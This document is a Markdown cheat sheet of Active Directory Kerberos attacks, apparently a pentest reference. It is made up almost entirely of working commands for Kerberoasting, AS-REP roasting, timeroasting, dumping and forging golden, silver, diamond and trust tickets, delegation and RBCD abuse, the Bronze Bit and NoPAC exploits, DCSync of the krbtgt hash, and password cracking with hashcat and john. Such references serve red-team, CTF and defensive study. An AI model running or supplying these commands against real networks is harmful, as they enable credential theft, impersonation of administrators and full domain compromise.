# Kerberos Attacks

## Kerberoasting

```ps1
# Impacket (Linux)
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

# Without pre-auth account
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/

# NetExec
netexec ldap 10.0.2.11 -u user -p pass --kerberoast output.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:Pass /outfile:hash.txt
Rubeus.exe kerberoast /tgtdeleg           # AES downgrade
Rubeus.exe kerberoast /rc4opsec           # stealth, RC4 only
# w/o pre-auth
Rubeus.exe kerberoast /outfile:out.txt /domain:domain.local /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SPN"

# Targeted Kerberoasting (GenericWrite on user)
targetedKerberoast.py -d domain.local -u user -p pass  # sets SPN, grabs hash, removes SPN

# Crack
hashcat -m 13100 -a 0 kerberos.txt rockyou.txt  # RC4 (etype 23)
hashcat -m 19600 -a 0 kerberos.txt rockyou.txt  # AES128 (etype 17)
hashcat -m 19700 -a 0 kerberos.txt rockyou.txt  # AES256 (etype 18)
john --wordlist=rockyou.txt --format=krb5tgs hashes.txt
```

## ASREPRoasting

```ps1
# Find accounts with DONT_REQ_PREAUTH
bloodyAD -u user -p pass -d domain.lab --host 10.10.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
PowerView> Get-DomainUser -PreauthNotRequired -Properties distinguishedname

# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep
GetNPUsers.py domain.local/svc-alfresco -no-pass

# NetExec
netexec ldap 10.0.2.11 -u user -p pass --asreproast output.txt

# Rubeus
Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast

# Crack
hashcat -m 18200 --force -a 0 hashes.asreproast passwords.txt
john --format=krb5asrep --wordlist=rockyou.txt hashes.asreproast
```

## Timeroasting

```ps1
# No auth required - uses NTP
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt rockyou.txt
```

## Kerberos Tickets (Golden/Silver/Diamond/Sapphire)

### Dump Tickets
```ps1
# Mimikatz
mimikatz> sekurlsa::tickets /export

# Rubeus
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7
```

### Ticket Conversion
```ps1
# kirbi ↔ ccache
kekeo> misc::convert ccache ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
```

### Replay Ticket
```ps1
mimikatz> kerberos::ptc C:\temp\ticket.ccache
KRB5CCNAME=/tmp/admin.ccache netexec smb 10.10.10.10 -u user --use-kcache
```

### Golden Ticket (krbtgt hash)
```ps1
# Get krbtgt hash
mimikatz> lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz> lsadump::lsa /inject /name:krbtgt

# Forge (Mimikatz)
kerberos::purge
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:HASH /ptt
# With extra SIDs (cross-forest)
kerberos::golden /user:evil /domain:child.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /krbtgt:HASH /ptt

# Forge (Impacket)
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXX -domain corp.local Administrator
ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXX -domain corp.local -user-id 500 -extra-sid S-1-5-21-XXX-512 Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass -dc-ip 10.10.10.10 domain/administrator@dc.domain.local
```

### Silver Ticket (service hash)
```ps1
# Forge for CIFS service
kerberos::golden /user:ANY /domain:domain.local /sid:S-1-5-21-XXX /target:TARGET.domain.local /rc4:MACHINE_NT_HASH /service:cifs /ptt

# Services to target
# CIFS → dir \\dc\c$
# LDAP → DCSync via Mimikatz
# HOST → scheduled tasks
# HTTP+wsman → WinRM / PowerShell Remoting
# RPCSS+LDAP+CIFS → RSAT tools
```

### Diamond Ticket
```ps1
Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASS /dc:DC /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
ticketer.py -request -domain domain.local -user user -password pass -nthash KRBTGT_HASH -aesKey KRBTGT_AES -domain-sid S-1-5-21-... -user-id 1337 -groups 512,513,518 baduser
```

## Unconstrained Delegation

```ps1
# Find
bloodyAD -u user -p pass -d domain.lab --host 10.10.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName
nxc ldap 10.10.10.10 -u user -p pass --trusted-for-delegation
BloodHound: MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Monitor for incoming TGTs
Rubeus.exe monitor /interval:1

# Coerce DC to authenticate (SpoolSample/PetitPotam)
.\SpoolSample.exe DC01.domain.local UNCONSTRAINED-SERVER.domain.local
python3 petitpotam.py -d domain -u user -p pass UNCONSTRAINED_SERVER DC_IP

# Extract TGT and DCSync
Rubeus.exe asktgs /ticket:<base64_TGT> /service:LDAP/dc.domain.local,cifs/dc.domain.local /ptt
mimikatz> lsadump::dcsync /user:krbtgt
```

## Constrained Delegation

```ps1
# Find
BloodHound: MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p
PowerView: Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
bloodyAD -u user -p pass -d domain.lab --host 10.10.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto

# Exploit (Impacket)
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:pass' -impersonate Administrator -dc-ip 10.10.10.10

# Exploit (Rubeus) S4U2self + S4U2proxy
Rubeus.exe s4u /user:user /rc4:NTLM_HASH /impersonateuser:Administrator /domain:domain.com /dc:dc01 /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
```

## Resource-Based Constrained Delegation (RBCD)

```ps1
# 1. Create attacker machine account
bloodyAD -u user -p pass -d domain.lab --host DC add computer swktest 'Weakest123*'
# OR
New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)

# 2. Set RBCD on target
bloodyAD --host DC -u user -p pass -d domain.lab add rbcd 'dc01-ww2$' 'swktest$'
# OR (PowerShell)
$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc01.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. Get hash of new machine account
Rubeus.exe hash /password:'Weakest123*' /user:swktest$ /domain:factory.lan

# 4. S4U2self + S4U2proxy
Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98... /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
# Impacket
getST.py -spn cifs/dc01.domain.local -impersonate Administrator 'domain.local/swktest$:Weakest123*'
```

## S4U2self Privilege Escalation

```ps1
# Get TGT (machine account)
Rubeus.exe tgtdeleg /nowrap
getTGT.py -dc-ip DC_IP -hashes :NT_HASH domain.local/'machine$'

# S4U2self to get admin ticket to self
Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:cifs/srv001.domain.local /ticket:BASE64_TGT /ptt
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip DC 'domain.local/machine$'
```

## Bronze Bit (CVE-2020-17049)

Bypass delegation protection, impersonate Protected Users via forwardable flag.

```ps1
# Force-forwardable S4U request
getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes LM:NT -aesKey AES test.local/Service1 -force-forwardable
mimikatz> kerberos::ptc User2.ccache
ls \\service2.test.local\c$
```

## NoPAC / sAMAccountName Spoofing (CVE-2021-42278/42287)

```ps1
# Check
nxc smb 10.10.10.10 -u '' -p '' -d domain -M nopac
nxc ldap 10.10.10.10 -u user -p pass -M MAQ

# Automated
python noPac.py 'domain.local/user' -hashes ':NTHASH' -dc-ip 10.10.10.10 -use-ldap -dump
noPac.exe -domain domain.local -user user -pass 'Pass' /dc dc.domain.local /mAccount demo123 /mPassword Pass123 /service cifs /ptt

# Manual
# 1. Create computer, 2. Clear SPN, 3. Rename to DC name, 4. Get TGT, 5. Rename back, 6. S4U2self, 7. DCSync
addcomputer.py -computer-name 'FakePC$' -computer-pass 'Pass' -dc-host DC01 domain.local/user:pass
renameMachine.py -current-name 'FakePC$' -new-name 'DC01' domain.local/user:pass
getTGT.py -dc-ip DC_IP domain.local/DC01:Pass
KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'DomAdmin' -spn 'cifs/DC01.domain.local' -k -no-pass domain.local/DC01
KRB5CCNAME='DomAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass domain.local@DC01.domain.local
```

## Trust Ticket (Child → Parent Forest)

```ps1
# Dump trust key
lsadump::trust /patch
lsadump::dcsync /user:child\parentdomain$

# Forge inter-realm TGT
kerberos::golden /domain:child.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /rc4:TRUST_KEY /user:Administrator /service:krbtgt /target:parent.local /ticket:c:\trust.kirbi

# Impacket ticketer
ticketer.py -nthash TRUST_NT_HASH -domain-sid S-1-5-21-CHILD -domain child.local -extra-sid S-1-5-21-PARENT-519 -spn krbtgt/parent.local AdminUser

# Get ST for parent resources
Rubeus.exe asktgs /ticket:c:\trust.kirbi /service:LDAP/dc.parent.local /ptt
```

## Kerberos Clock Skew

```ps1
# Detect
nmap -sV -sC 10.10.10.10  # look for clock-skew
nmap -sT 10.10.10.10 -p445 --script smb2-time -vv

# Fix
sudo date -s "14 APR 2015 18:25:16"
faketime -f '+8h' date
net time /domain /set
```
